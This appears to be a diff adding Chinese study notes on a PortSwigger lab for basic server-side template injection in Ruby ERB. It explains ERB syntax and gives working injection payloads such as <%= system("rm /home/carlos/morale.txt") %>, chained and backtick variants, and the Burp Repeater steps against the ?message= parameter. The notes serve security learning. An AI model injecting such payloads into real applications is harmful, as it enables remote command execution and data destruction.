@@ -1,0 +1,41 @@
+靶场地址: https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-basic
+
+=====新知识1: ERB_Ruby=====
+Ruby : 一种通用编程语言,和 py坐一桌的
+ERB : Ruby配套的一种 网页模板格式 
+      -> 开发者先写好网页骨架,然后让 ERB把 Ruby表达式的结果填进去
+
+=====新知识2: erb简单命令
+比如:
+</> erb
+欢迎你,<%= username %>
+->
+这里的 <%= %> 就类似 py的 f"{}"
+
+# 运行一条命令
+<%= system("rm /home/carlos/morale.txt")%>
+->
+system: 执行后面的 shell命令
+rm : 之前linux里面学过,删除东西用的
+
+# 运行两条命令, 分号; 隔开两条命令
+1. <%= system("echo test123; rm /home/carlos/morale.txt")%>
+不过 system()的返回值通常是 true/false,有时因为网页限制,还无法从响应里面找到证据
+2. <%= `echo test123`%>
+   <%= `echo test123; rm /home/carlos/morale.txt`%>
+依旧是反引号昂
+
+###
+进入靶场
+本lab在查询第一个产品是会蹦 '缺货',进不去产品详情页
+这一行小字真的很隐蔽......     -> 图1
+=>
+此时回到burp,能找到一个对应的 GET /?message=   -> 图2
+丢给repeater
+
+###
+把上面rest123定位的命令塞进去  -> 图3
+=>
+<%= system("echo test123; rm /home/carlos/morale.txt")%>
+进行 url编码之后,也扔进去   -> 图4
+solved
